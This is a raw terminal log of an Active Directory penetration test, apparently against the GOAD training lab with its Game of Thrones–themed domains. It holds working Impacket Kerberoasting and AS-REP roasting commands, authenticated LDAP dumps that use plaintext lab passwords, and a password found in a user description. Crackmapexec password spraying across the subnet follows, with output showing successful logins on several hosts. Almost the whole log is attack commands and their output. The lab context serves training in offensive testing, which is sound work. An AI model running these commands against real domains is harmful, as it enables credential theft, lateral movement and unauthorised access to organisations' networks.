(myenv) root@tala-HP-255-15-6-inch-G10-Notebook-PC:~# GetUserSPNs.py north.sevenkingdoms.local/hodor:hodor -dc-ip 192.168.20.11 -outputfile kerberoast.txt

# Gegen KINGSLANDING Domain (sevenkingdoms.local)
GetUserSPNs.py sevenkingdoms.local/user:pass -dc-ip 192.168.20.10 -outputfile kerberoast_main.txt

# Gegen ESSOS Domain (essos.local)
GetUserSPNs.py essos.local/user:pass -dc-ip 192.168.20.12 -outputfile kerberoast_essos.txt
/home/tala/myenv/lib/python3.12/site-packages/impacket/version.py:12: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  import pkg_resources
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

ServicePrincipalName                                 Name         MemberOf                                                    PasswordLastSet             LastLogon                   Delegation  
---------------------------------------------------  -----------  ----------------------------------------------------------  --------------------------  --------------------------  -----------
HTTP/eyrie.north.sevenkingdoms.local                 sansa.stark  CN=Stark,CN=Users,DC=north,DC=sevenkingdoms,DC=local        2025-04-13 18:44:32.702102  <never>                                 
CIFS/thewall.north.sevenkingdoms.local               jon.snow     CN=Night Watch,CN=Users,DC=north,DC=sevenkingdoms,DC=local  2025-04-13 18:45:11.138577  <never>                     constrained 
HTTP/thewall.north.sevenkingdoms.local               jon.snow     CN=Night Watch,CN=Users,DC=north,DC=sevenkingdoms,DC=local  2025-04-13 18:45:11.138577  <never>                     constrained 
MSSQLSvc/castelblack.north.sevenkingdoms.local       sql_svc                                                                  2025-04-13 18:45:36.012934  2025-04-13 19:12:10.107555              
MSSQLSvc/castelblack.north.sevenkingdoms.local:1433  sql_svc                                                                  2025-04-13 18:45:36.012934  2025-04-13 19:12:10.107555              



[-] CCache file is not found. Skipping...
/home/tala/myenv/lib/python3.12/site-packages/impacket/version.py:12: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  import pkg_resources
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[-] Error in bindRequest -> invalidCredentials: 8009030C: LdapErr: DSID-0C090690, comment: AcceptSecurityContext error, data 52e, v4563
/home/tala/myenv/lib/python3.12/site-packages/impacket/version.py:12: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  import pkg_resources
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[-] Error in bindRequest -> invalidCredentials: 8009030C: LdapErr: DSID-0C09062E, comment: AcceptSecurityContext error, data 52e, v3839
(myenv) root@tala-HP-255-15-6-inch-G10-Notebook-PC:~# ldapsearch -x -H ldap://192.168.20.11 -b "DC=north,DC=sevenkingdoms,DC=local" "(objectClass=user)" sAMAccountName | grep sAMAccountName | cut -d: -f2 | tr -d ' ' > users.txt

# AS-REP Roasting durchführen
GetNPUsers.py north.sevenkingdoms.local/ -dc-ip 192.168.20.11 -usersfile users.txt -outputfile asrep_hashes.txt
/home/tala/myenv/lib/python3.12/site-packages/impacket/version.py:12: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  import pkg_resources
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

/home/tala/myenv/bin/GetNPUsers.py:165: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  now = datetime.datetime.utcnow() + datetime.timedelta(days=1)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)



➜  ~ # Mit gültigen Credentials komplette LDAP-Dumps
ldapsearch -x -H ldap://192.168.20.11 -D "north\jon.snow" -w iknownothing -b "DC=north,DC=sevenkingdoms,DC=local" "(objectClass=*)" > ldap_dump_north.txt

# Spezifische Objekt-Klassen
ldapsearch -x -H ldap://192.168.20.11 -D "north\jon.snow" -w iknownothing -b "DC=north,DC=sevenkingdoms,DC=local" "(objectClass=user)" sAMAccountName userPrincipalName description

ldapsearch -x -H ldap://192.168.20.11 -D "north\jon.snow" -w iknownothing -b "DC=north,DC=sevenkingdoms,DC=local" "(objectClass=group)" sAMAccountName member

# Service Principal Names mit Authentifizierung
ldapsearch -x -H ldap://192.168.20.11 -D "north\jon.snow" -w iknownothing -b "DC=north,DC=sevenkingdoms,DC=local" "servicePrincipalName=*" servicePrincipalName sAMAccountName
# extended LDIF
#
# LDAPv3
# base <DC=north,DC=sevenkingdoms,DC=local> with scope subtree
# filter: (objectClass=user)
# requesting: sAMAccountName userPrincipalName description 
#

# Administrator, Users, north.sevenkingdoms.local
dn: CN=Administrator,CN=Users,DC=north,DC=sevenkingdoms,DC=local
description: Built-in account for administering the computer/domain
sAMAccountName: Administrator

# Guest, Users, north.sevenkingdoms.local
dn: CN=Guest,CN=Users,DC=north,DC=sevenkingdoms,DC=local
description: Built-in account for guest access to the computer/domain
sAMAccountName: Guest

# vagrant, Users, north.sevenkingdoms.local
dn: CN=vagrant,CN=Users,DC=north,DC=sevenkingdoms,DC=local
description: Vagrant User
sAMAccountName: vagrant

# cloudbase-init, Users, north.sevenkingdoms.local
dn: CN=cloudbase-init,CN=Users,DC=north,DC=sevenkingdoms,DC=local
sAMAccountName: cloudbase-init

# WINTERFELL, Domain Controllers, north.sevenkingdoms.local
dn: CN=WINTERFELL,OU=Domain Controllers,DC=north,DC=sevenkingdoms,DC=local
sAMAccountName: WINTERFELL$

# krbtgt, Users, north.sevenkingdoms.local
dn: CN=krbtgt,CN=Users,DC=north,DC=sevenkingdoms,DC=local
description: Key Distribution Center Service Account
sAMAccountName: krbtgt

# CASTELBLACK, Computers, north.sevenkingdoms.local
dn: CN=CASTELBLACK,CN=Computers,DC=north,DC=sevenkingdoms,DC=local
sAMAccountName: CASTELBLACK$

# SEVENKINGDOMS$, Users, north.sevenkingdoms.local
dn: CN=SEVENKINGDOMS$,CN=Users,DC=north,DC=sevenkingdoms,DC=local
sAMAccountName: SEVENKINGDOMS$

# arya.stark, Users, north.sevenkingdoms.local
dn: CN=arya.stark,CN=Users,DC=north,DC=sevenkingdoms,DC=local
description: Arya Stark
sAMAccountName: arya.stark

# eddard.stark, Users, north.sevenkingdoms.local
dn: CN=eddard.stark,CN=Users,DC=north,DC=sevenkingdoms,DC=local
description: Eddard Stark
sAMAccountName: eddard.stark

# catelyn.stark, Users, north.sevenkingdoms.local
dn: CN=catelyn.stark,CN=Users,DC=north,DC=sevenkingdoms,DC=local
description: Catelyn Stark
sAMAccountName: catelyn.stark

# robb.stark, Users, north.sevenkingdoms.local
dn: CN=robb.stark,CN=Users,DC=north,DC=sevenkingdoms,DC=local
description: Robb Stark
sAMAccountName: robb.stark

# sansa.stark, Users, north.sevenkingdoms.local
dn: CN=sansa.stark,CN=Users,DC=north,DC=sevenkingdoms,DC=local
description: Sansa Stark
sAMAccountName: sansa.stark

# brandon.stark, Users, north.sevenkingdoms.local
dn: CN=brandon.stark,CN=Users,DC=north,DC=sevenkingdoms,DC=local
description: Brandon Stark
sAMAccountName: brandon.stark

# rickon.stark, Users, north.sevenkingdoms.local
dn: CN=rickon.stark,CN=Users,DC=north,DC=sevenkingdoms,DC=local
description: Rickon Stark
sAMAccountName: rickon.stark

# hodor, Users, north.sevenkingdoms.local
dn: CN=hodor,CN=Users,DC=north,DC=sevenkingdoms,DC=local
description: Brainless Giant
sAMAccountName: hodor

# jon.snow, Users, north.sevenkingdoms.local
dn: CN=jon.snow,CN=Users,DC=north,DC=sevenkingdoms,DC=local
description: Jon Snow
sAMAccountName: jon.snow

# samwell.tarly, Users, north.sevenkingdoms.local
dn: CN=samwell.tarly,CN=Users,DC=north,DC=sevenkingdoms,DC=local
description: Samwell Tarly (Password : Heartsbane)
sAMAccountName: samwell.tarly

# jeor.mormont, Users, north.sevenkingdoms.local
dn: CN=jeor.mormont,CN=Users,DC=north,DC=sevenkingdoms,DC=local
description: Jeor Mormont
sAMAccountName: jeor.mormont

# sql_svc, Users, north.sevenkingdoms.local
dn: CN=sql_svc,CN=Users,DC=north,DC=sevenkingdoms,DC=local
description: sql service
sAMAccountName: sql_svc

# search reference
ref: ldap://DomainDnsZones.north.sevenkingdoms.local/DC=DomainDnsZones,DC=nort
 h,DC=sevenkingdoms,DC=local

# search result
search: 2
result: 0 Success

# numResponses: 22
# numEntries: 20
# numReferences: 1
# extended LDIF
#
# LDAPv3
# base <DC=north,DC=sevenkingdoms,DC=local> with scope subtree
# filter: (objectClass=group)
# requesting: sAMAccountName member 
#

# Administrators, Builtin, north.sevenkingdoms.local
dn: CN=Administrators,CN=Builtin,DC=north,DC=sevenkingdoms,DC=local
member: CN=robb.stark,CN=Users,DC=north,DC=sevenkingdoms,DC=local
member: CN=catelyn.stark,CN=Users,DC=north,DC=sevenkingdoms,DC=local
member: CN=eddard.stark,CN=Users,DC=north,DC=sevenkingdoms,DC=local
member: CN=Enterprise Admins,CN=Users,DC=sevenkingdoms,DC=local
member: CN=Domain Admins,CN=Users,DC=north,DC=sevenkingdoms,DC=local
member: CN=cloudbase-init,CN=Users,DC=north,DC=sevenkingdoms,DC=local
member: CN=vagrant,CN=Users,DC=north,DC=sevenkingdoms,DC=local
member: CN=Administrator,CN=Users,DC=north,DC=sevenkingdoms,DC=local
sAMAccountName: Administrators

# Users, Builtin, north.sevenkingdoms.local
dn: CN=Users,CN=Builtin,DC=north,DC=sevenkingdoms,DC=local
member: CN=Domain Users,CN=Users,DC=north,DC=sevenkingdoms,DC=local
member: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=north,DC=sevenkingdoms,DC=
 local
member: CN=S-1-5-4,CN=ForeignSecurityPrincipals,DC=north,DC=sevenkingdoms,DC=l
 ocal
member: CN=vagrant,CN=Users,DC=north,DC=sevenkingdoms,DC=local
sAMAccountName: Users

# Guests, Builtin, north.sevenkingdoms.local
dn: CN=Guests,CN=Builtin,DC=north,DC=sevenkingdoms,DC=local
member: CN=Domain Guests,CN=Users,DC=north,DC=sevenkingdoms,DC=local
member: CN=Guest,CN=Users,DC=north,DC=sevenkingdoms,DC=local
sAMAccountName: Guests

# Print Operators, Builtin, north.sevenkingdoms.local
dn: CN=Print Operators,CN=Builtin,DC=north,DC=sevenkingdoms,DC=local
sAMAccountName: Print Operators

# Backup Operators, Builtin, north.sevenkingdoms.local
dn: CN=Backup Operators,CN=Builtin,DC=north,DC=sevenkingdoms,DC=local
sAMAccountName: Backup Operators

# Replicator, Builtin, north.sevenkingdoms.local
dn: CN=Replicator,CN=Builtin,DC=north,DC=sevenkingdoms,DC=local
sAMAccountName: Replicator

# Remote Desktop Users, Builtin, north.sevenkingdoms.local
dn: CN=Remote Desktop Users,CN=Builtin,DC=north,DC=sevenkingdoms,DC=local
member: CN=Stark,CN=Users,DC=north,DC=sevenkingdoms,DC=local
sAMAccountName: Remote Desktop Users

# Network Configuration Operators, Builtin, north.sevenkingdoms.local
dn: CN=Network Configuration Operators,CN=Builtin,DC=north,DC=sevenkingdoms,DC
 =local
sAMAccountName: Network Configuration Operators

# Performance Monitor Users, Builtin, north.sevenkingdoms.local
dn: CN=Performance Monitor Users,CN=Builtin,DC=north,DC=sevenkingdoms,DC=local
sAMAccountName: Performance Monitor Users

# Performance Log Users, Builtin, north.sevenkingdoms.local
dn: CN=Performance Log Users,CN=Builtin,DC=north,DC=sevenkingdoms,DC=local
sAMAccountName: Performance Log Users

# Distributed COM Users, Builtin, north.sevenkingdoms.local
dn: CN=Distributed COM Users,CN=Builtin,DC=north,DC=sevenkingdoms,DC=local
sAMAccountName: Distributed COM Users

# IIS_IUSRS, Builtin, north.sevenkingdoms.local
dn: CN=IIS_IUSRS,CN=Builtin,DC=north,DC=sevenkingdoms,DC=local
member: CN=S-1-5-17,CN=ForeignSecurityPrincipals,DC=north,DC=sevenkingdoms,DC=
 local
sAMAccountName: IIS_IUSRS

# Cryptographic Operators, Builtin, north.sevenkingdoms.local
dn: CN=Cryptographic Operators,CN=Builtin,DC=north,DC=sevenkingdoms,DC=local
sAMAccountName: Cryptographic Operators

# Event Log Readers, Builtin, north.sevenkingdoms.local
dn: CN=Event Log Readers,CN=Builtin,DC=north,DC=sevenkingdoms,DC=local
sAMAccountName: Event Log Readers

# Certificate Service DCOM Access, Builtin, north.sevenkingdoms.local
dn: CN=Certificate Service DCOM Access,CN=Builtin,DC=north,DC=sevenkingdoms,DC
 =local
sAMAccountName: Certificate Service DCOM Access

# RDS Remote Access Servers, Builtin, north.sevenkingdoms.local
dn: CN=RDS Remote Access Servers,CN=Builtin,DC=north,DC=sevenkingdoms,DC=local
sAMAccountName: RDS Remote Access Servers

# RDS Endpoint Servers, Builtin, north.sevenkingdoms.local
dn: CN=RDS Endpoint Servers,CN=Builtin,DC=north,DC=sevenkingdoms,DC=local
sAMAccountName: RDS Endpoint Servers

# RDS Management Servers, Builtin, north.sevenkingdoms.local
dn: CN=RDS Management Servers,CN=Builtin,DC=north,DC=sevenkingdoms,DC=local
sAMAccountName: RDS Management Servers

# Hyper-V Administrators, Builtin, north.sevenkingdoms.local
dn: CN=Hyper-V Administrators,CN=Builtin,DC=north,DC=sevenkingdoms,DC=local
sAMAccountName: Hyper-V Administrators

# Access Control Assistance Operators, Builtin, north.sevenkingdoms.local
dn: CN=Access Control Assistance Operators,CN=Builtin,DC=north,DC=sevenkingdom
 s,DC=local
sAMAccountName: Access Control Assistance Operators

# Remote Management Users, Builtin, north.sevenkingdoms.local
dn: CN=Remote Management Users,CN=Builtin,DC=north,DC=sevenkingdoms,DC=local
sAMAccountName: Remote Management Users

# Storage Replica Administrators, Builtin, north.sevenkingdoms.local
dn: CN=Storage Replica Administrators,CN=Builtin,DC=north,DC=sevenkingdoms,DC=
 local
sAMAccountName: Storage Replica Administrators

# Domain Computers, Users, north.sevenkingdoms.local
dn: CN=Domain Computers,CN=Users,DC=north,DC=sevenkingdoms,DC=local
sAMAccountName: Domain Computers

# Domain Controllers, Users, north.sevenkingdoms.local
dn: CN=Domain Controllers,CN=Users,DC=north,DC=sevenkingdoms,DC=local
sAMAccountName: Domain Controllers

# Cert Publishers, Users, north.sevenkingdoms.local
dn: CN=Cert Publishers,CN=Users,DC=north,DC=sevenkingdoms,DC=local
sAMAccountName: Cert Publishers

# Domain Admins, Users, north.sevenkingdoms.local
dn: CN=Domain Admins,CN=Users,DC=north,DC=sevenkingdoms,DC=local
member: CN=eddard.stark,CN=Users,DC=north,DC=sevenkingdoms,DC=local
member: CN=Administrator,CN=Users,DC=north,DC=sevenkingdoms,DC=local
sAMAccountName: Domain Admins

# Domain Users, Users, north.sevenkingdoms.local
dn: CN=Domain Users,CN=Users,DC=north,DC=sevenkingdoms,DC=local
sAMAccountName: Domain Users

# Domain Guests, Users, north.sevenkingdoms.local
dn: CN=Domain Guests,CN=Users,DC=north,DC=sevenkingdoms,DC=local
sAMAccountName: Domain Guests

# Group Policy Creator Owners, Users, north.sevenkingdoms.local
dn: CN=Group Policy Creator Owners,CN=Users,DC=north,DC=sevenkingdoms,DC=local
member: CN=Administrator,CN=Users,DC=north,DC=sevenkingdoms,DC=local
sAMAccountName: Group Policy Creator Owners

# RAS and IAS Servers, Users, north.sevenkingdoms.local
dn: CN=RAS and IAS Servers,CN=Users,DC=north,DC=sevenkingdoms,DC=local
sAMAccountName: RAS and IAS Servers

# Server Operators, Builtin, north.sevenkingdoms.local
dn: CN=Server Operators,CN=Builtin,DC=north,DC=sevenkingdoms,DC=local
sAMAccountName: Server Operators

# Account Operators, Builtin, north.sevenkingdoms.local
dn: CN=Account Operators,CN=Builtin,DC=north,DC=sevenkingdoms,DC=local
sAMAccountName: Account Operators

# Pre-Windows 2000 Compatible Access, Builtin, north.sevenkingdoms.local
dn: CN=Pre-Windows 2000 Compatible Access,CN=Builtin,DC=north,DC=sevenkingdoms
 ,DC=local
member: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=north,DC=sevenkingdoms,DC=
 local
sAMAccountName: Pre-Windows 2000 Compatible Access

# Windows Authorization Access Group, Builtin, north.sevenkingdoms.local
dn: CN=Windows Authorization Access Group,CN=Builtin,DC=north,DC=sevenkingdoms
 ,DC=local
member: CN=S-1-5-9,CN=ForeignSecurityPrincipals,DC=north,DC=sevenkingdoms,DC=l
 ocal
sAMAccountName: Windows Authorization Access Group

# Terminal Server License Servers, Builtin, north.sevenkingdoms.local
dn: CN=Terminal Server License Servers,CN=Builtin,DC=north,DC=sevenkingdoms,DC
 =local
sAMAccountName: Terminal Server License Servers

# Allowed RODC Password Replication Group, Users, north.sevenkingdoms.local
dn: CN=Allowed RODC Password Replication Group,CN=Users,DC=north,DC=sevenkingd
 oms,DC=local
sAMAccountName: Allowed RODC Password Replication Group

# Denied RODC Password Replication Group, Users, north.sevenkingdoms.local
dn: CN=Denied RODC Password Replication Group,CN=Users,DC=north,DC=sevenkingdo
 ms,DC=local
member: CN=Enterprise Admins,CN=Users,DC=sevenkingdoms,DC=local
member: CN=Schema Admins,CN=Users,DC=sevenkingdoms,DC=local
member: CN=Read-only Domain Controllers,CN=Users,DC=north,DC=sevenkingdoms,DC=
 local
member: CN=Group Policy Creator Owners,CN=Users,DC=north,DC=sevenkingdoms,DC=l
 ocal
member: CN=Domain Admins,CN=Users,DC=north,DC=sevenkingdoms,DC=local
member: CN=Cert Publishers,CN=Users,DC=north,DC=sevenkingdoms,DC=local
member: CN=Domain Controllers,CN=Users,DC=north,DC=sevenkingdoms,DC=local
member: CN=krbtgt,CN=Users,DC=north,DC=sevenkingdoms,DC=local
sAMAccountName: Denied RODC Password Replication Group

# Read-only Domain Controllers, Users, north.sevenkingdoms.local
dn: CN=Read-only Domain Controllers,CN=Users,DC=north,DC=sevenkingdoms,DC=loca
 l
sAMAccountName: Read-only Domain Controllers

# Cloneable Domain Controllers, Users, north.sevenkingdoms.local
dn: CN=Cloneable Domain Controllers,CN=Users,DC=north,DC=sevenkingdoms,DC=loca
 l
sAMAccountName: Cloneable Domain Controllers

# Protected Users, Users, north.sevenkingdoms.local
dn: CN=Protected Users,CN=Users,DC=north,DC=sevenkingdoms,DC=local
sAMAccountName: Protected Users

# Key Admins, Users, north.sevenkingdoms.local
dn: CN=Key Admins,CN=Users,DC=north,DC=sevenkingdoms,DC=local
sAMAccountName: Key Admins

# DnsAdmins, Users, north.sevenkingdoms.local
dn: CN=DnsAdmins,CN=Users,DC=north,DC=sevenkingdoms,DC=local
sAMAccountName: DnsAdmins

# DnsUpdateProxy, Users, north.sevenkingdoms.local
dn: CN=DnsUpdateProxy,CN=Users,DC=north,DC=sevenkingdoms,DC=local
sAMAccountName: DnsUpdateProxy

# Stark, Users, north.sevenkingdoms.local
dn: CN=Stark,CN=Users,DC=north,DC=sevenkingdoms,DC=local
member: CN=jon.snow,CN=Users,DC=north,DC=sevenkingdoms,DC=local
member: CN=hodor,CN=Users,DC=north,DC=sevenkingdoms,DC=local
member: CN=rickon.stark,CN=Users,DC=north,DC=sevenkingdoms,DC=local
member: CN=brandon.stark,CN=Users,DC=north,DC=sevenkingdoms,DC=local
member: CN=sansa.stark,CN=Users,DC=north,DC=sevenkingdoms,DC=local
member: CN=robb.stark,CN=Users,DC=north,DC=sevenkingdoms,DC=local
member: CN=catelyn.stark,CN=Users,DC=north,DC=sevenkingdoms,DC=local
member: CN=eddard.stark,CN=Users,DC=north,DC=sevenkingdoms,DC=local
member: CN=arya.stark,CN=Users,DC=north,DC=sevenkingdoms,DC=local
sAMAccountName: Stark

# Night Watch, Users, north.sevenkingdoms.local
dn: CN=Night Watch,CN=Users,DC=north,DC=sevenkingdoms,DC=local
member: CN=jeor.mormont,CN=Users,DC=north,DC=sevenkingdoms,DC=local
member: CN=samwell.tarly,CN=Users,DC=north,DC=sevenkingdoms,DC=local
member: CN=jon.snow,CN=Users,DC=north,DC=sevenkingdoms,DC=local
sAMAccountName: Night Watch

# Mormont, Users, north.sevenkingdoms.local
dn: CN=Mormont,CN=Users,DC=north,DC=sevenkingdoms,DC=local
member: CN=jeor.mormont,CN=Users,DC=north,DC=sevenkingdoms,DC=local
sAMAccountName: Mormont

# AcrossTheSea, Users, north.sevenkingdoms.local
dn: CN=AcrossTheSea,CN=Users,DC=north,DC=sevenkingdoms,DC=local
sAMAccountName: AcrossTheSea

# search reference
ref: ldap://DomainDnsZones.north.sevenkingdoms.local/DC=DomainDnsZones,DC=nort
 h,DC=sevenkingdoms,DC=local

# search result
search: 2
result: 0 Success

# numResponses: 49
# numEntries: 47
# numReferences: 1
# extended LDIF
#
# LDAPv3
# base <DC=north,DC=sevenkingdoms,DC=local> with scope subtree
# filter: servicePrincipalName=*
# requesting: servicePrincipalName sAMAccountName 
#

# jon.snow, Users, north.sevenkingdoms.local
dn: CN=jon.snow,CN=Users,DC=north,DC=sevenkingdoms,DC=local
sAMAccountName: jon.snow
servicePrincipalName: CIFS/thewall.north.sevenkingdoms.local
servicePrincipalName: HTTP/thewall.north.sevenkingdoms.local

# WINTERFELL, Domain Controllers, north.sevenkingdoms.local
dn: CN=WINTERFELL,OU=Domain Controllers,DC=north,DC=sevenkingdoms,DC=local
sAMAccountName: WINTERFELL$
servicePrincipalName: ldap/winterfell.north.sevenkingdoms.local/DomainDnsZones
 .north.sevenkingdoms.local
servicePrincipalName: ldap/winterfell.north.sevenkingdoms.local/ForestDnsZones
 .sevenkingdoms.local
servicePrincipalName: TERMSRV/WINTERFELL
servicePrincipalName: TERMSRV/winterfell.north.sevenkingdoms.local
servicePrincipalName: Dfsr-12F9A27C-BF97-4787-9364-D31B6C55EB04/winterfell.nor
 th.sevenkingdoms.local
servicePrincipalName: DNS/winterfell.north.sevenkingdoms.local
servicePrincipalName: GC/winterfell.north.sevenkingdoms.local/sevenkingdoms.lo
 cal
servicePrincipalName: RestrictedKrbHost/winterfell.north.sevenkingdoms.local
servicePrincipalName: RestrictedKrbHost/WINTERFELL
servicePrincipalName: RPC/3ae44b93-a578-483b-9a12-f99cab7a2951._msdcs.sevenkin
 gdoms.local
servicePrincipalName: HOST/WINTERFELL/NORTH
servicePrincipalName: HOST/winterfell.north.sevenkingdoms.local/NORTH
servicePrincipalName: HOST/WINTERFELL
servicePrincipalName: HOST/winterfell.north.sevenkingdoms.local
servicePrincipalName: HOST/winterfell.north.sevenkingdoms.local/north.sevenkin
 gdoms.local
servicePrincipalName: E3514235-4B06-11D1-AB04-00C04FC2DCD2/3ae44b93-a578-483b-
 9a12-f99cab7a2951/north.sevenkingdoms.local
servicePrincipalName: ldap/WINTERFELL/NORTH
servicePrincipalName: ldap/3ae44b93-a578-483b-9a12-f99cab7a2951._msdcs.sevenki
 ngdoms.local
servicePrincipalName: ldap/winterfell.north.sevenkingdoms.local/NORTH
servicePrincipalName: ldap/WINTERFELL
servicePrincipalName: ldap/winterfell.north.sevenkingdoms.local
servicePrincipalName: ldap/winterfell.north.sevenkingdoms.local/north.sevenkin
 gdoms.local

# CASTELBLACK, Computers, north.sevenkingdoms.local
dn: CN=CASTELBLACK,CN=Computers,DC=north,DC=sevenkingdoms,DC=local
sAMAccountName: CASTELBLACK$
servicePrincipalName: HTTP/winterfell.north.sevenkingdoms.local
servicePrincipalName: TERMSRV/CASTELBLACK
servicePrincipalName: TERMSRV/castelblack.north.sevenkingdoms.local
servicePrincipalName: RestrictedKrbHost/CASTELBLACK
servicePrincipalName: HOST/CASTELBLACK
servicePrincipalName: RestrictedKrbHost/castelblack.north.sevenkingdoms.local
servicePrincipalName: HOST/castelblack.north.sevenkingdoms.local

# sansa.stark, Users, north.sevenkingdoms.local
dn: CN=sansa.stark,CN=Users,DC=north,DC=sevenkingdoms,DC=local
sAMAccountName: sansa.stark
servicePrincipalName: HTTP/eyrie.north.sevenkingdoms.local

# krbtgt, Users, north.sevenkingdoms.local
dn: CN=krbtgt,CN=Users,DC=north,DC=sevenkingdoms,DC=local
sAMAccountName: krbtgt
servicePrincipalName: kadmin/changepw

# sql_svc, Users, north.sevenkingdoms.local
dn: CN=sql_svc,CN=Users,DC=north,DC=sevenkingdoms,DC=local
sAMAccountName: sql_svc
servicePrincipalName: MSSQLSvc/castelblack.north.sevenkingdoms.local
servicePrincipalName: MSSQLSvc/castelblack.north.sevenkingdoms.local:1433

# search reference
ref: ldap://DomainDnsZones.north.sevenkingdoms.local/DC=DomainDnsZones,DC=nort
 h,DC=sevenkingdoms,DC=local

# search result
search: 2
result: 0 Success

# numResponses: 8
# numEntries: 6
# numReferences: 1


root@tala-HP-255-15-6-inch-G10-Notebook-PC:~/goatlab/recon# crackmapexec smb 192.168.20.0/24 -u jon.snow -p iknownothing
crackmapexec smb 192.168.20.0/24 -u brandon.stark -p iseedeadpeople
crackmapexec smb 192.168.20.0/24 -u samwell.tarly -p Heartsbane

# Erfolgreiche Logins identifizieren
crackmapexec smb 192.168.20.0/24 -u jon.snow -p iknownothing --shares
SMB         192.168.20.22   445    CASTELBLACK      [*] Windows 10.0 Build 17763 x64 (name:CASTELBLACK) (domain:north.sevenkingdoms.local) (signing:False) (SMBv1:False)
SMB         192.168.20.10   445    KINGSLANDING     [*] Windows 10.0 Build 17763 x64 (name:KINGSLANDING) (domain:sevenkingdoms.local) (signing:True) (SMBv1:False)
SMB         192.168.20.12   445    MEEREEN          [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:MEEREEN) (domain:essos.local) (signing:True) (SMBv1:True)
SMB         192.168.20.11   445    WINTERFELL       [*] Windows 10.0 Build 17763 x64 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (signing:True) (SMBv1:False)
SMB         192.168.20.23   445    BRAAVOS          [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:BRAAVOS) (domain:essos.local) (signing:False) (SMBv1:True)
SMB         192.168.20.22   445    CASTELBLACK      [+] north.sevenkingdoms.local\jon.snow:iknownothing
SMB         192.168.20.10   445    KINGSLANDING     [-] sevenkingdoms.local\jon.snow:iknownothing STATUS_LOGON_FAILURE
SMB         192.168.20.12   445    MEEREEN          [-] essos.local\jon.snow:iknownothing STATUS_LOGON_FAILURE
SMB         192.168.20.11   445    WINTERFELL       [+] north.sevenkingdoms.local\jon.snow:iknownothing
SMB         192.168.20.23   445    BRAAVOS          [+] essos.local\jon.snow:iknownothing 
Running CME against 256 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00
SMB         192.168.20.23   445    BRAAVOS          [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:BRAAVOS) (domain:essos.local) (signing:False) (SMBv1:True)
SMB         192.168.20.12   445    MEEREEN          [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:MEEREEN) (domain:essos.local) (signing:True) (SMBv1:True)
SMB         192.168.20.11   445    WINTERFELL       [*] Windows 10.0 Build 17763 x64 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (signing:True) (SMBv1:False)
SMB         192.168.20.22   445    CASTELBLACK      [*] Windows 10.0 Build 17763 x64 (name:CASTELBLACK) (domain:north.sevenkingdoms.local) (signing:False) (SMBv1:False)
SMB         192.168.20.10   445    KINGSLANDING     [*] Windows 10.0 Build 17763 x64 (name:KINGSLANDING) (domain:sevenkingdoms.local) (signing:True) (SMBv1:False)
SMB         192.168.20.23   445    BRAAVOS          [+] essos.local\brandon.stark:iseedeadpeople
SMB         192.168.20.12   445    MEEREEN          [-] essos.local\brandon.stark:iseedeadpeople STATUS_LOGON_FAILURE
SMB         192.168.20.11   445    WINTERFELL       [+] north.sevenkingdoms.local\brandon.stark:iseedeadpeople
SMB         192.168.20.22   445    CASTELBLACK      [+] north.sevenkingdoms.local\brandon.stark:iseedeadpeople
SMB         192.168.20.10   445    KINGSLANDING     [-] sevenkingdoms.local\brandon.stark:iseedeadpeople STATUS_LOGON_FAILURE
Running CME against 256 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00
SMB         192.168.20.12   445    MEEREEN          [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:MEEREEN) (domain:essos.local) (signing:True) (SMBv1:True)
SMB         192.168.20.23   445    BRAAVOS          [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:BRAAVOS) (domain:essos.local) (signing:False) (SMBv1:True)
SMB         192.168.20.22   445    CASTELBLACK      [*] Windows 10.0 Build 17763 x64 (name:CASTELBLACK) (domain:north.sevenkingdoms.local) (signing:False) (SMBv1:False)
SMB         192.168.20.10   445    KINGSLANDING     [*] Windows 10.0 Build 17763 x64 (name:KINGSLANDING) (domain:sevenkingdoms.local) (signing:True) (SMBv1:False)
SMB         192.168.20.11   445    WINTERFELL       [*] Windows 10.0 Build 17763 x64 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (signing:True) (SMBv1:False)
SMB         192.168.20.12   445    MEEREEN          [-] essos.local\samwell.tarly:Heartsbane STATUS_LOGON_FAILURE
SMB         192.168.20.23   445    BRAAVOS          [+] essos.local\samwell.tarly:Heartsbane 
SMB         192.168.20.22   445    CASTELBLACK      [+] north.sevenkingdoms.local\samwell.tarly:Heartsbane
SMB         192.168.20.10   445    KINGSLANDING     [-] sevenkingdoms.local\samwell.tarly:Heartsbane STATUS_LOGON_FAILURE
SMB         192.168.20.11   445    WINTERFELL       [+] north.sevenkingdoms.local\samwell.tarly:Heartsbane
